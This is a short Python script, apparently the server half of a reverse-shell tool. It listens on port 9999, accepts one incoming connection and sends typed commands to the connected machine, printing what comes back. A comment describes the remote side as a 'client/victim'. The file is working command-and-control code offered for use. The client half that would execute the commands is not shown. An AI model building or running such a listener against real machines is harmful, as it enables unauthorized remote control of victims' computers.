# single_server

import socket
import sys


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global sock
        host = ""
        port = 9999
        sock = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global sock
        print("Binding the Port: " + str(port))

        sock.bind((host, port))
        sock.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = sock.accept()
    print("Connection has been established!\nIP: " + address[0] + "\nPort: " + str(address[1]))
    send_commands(conn)
    conn.close()


# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            sock.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(5120), "utf-8")
            print()
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
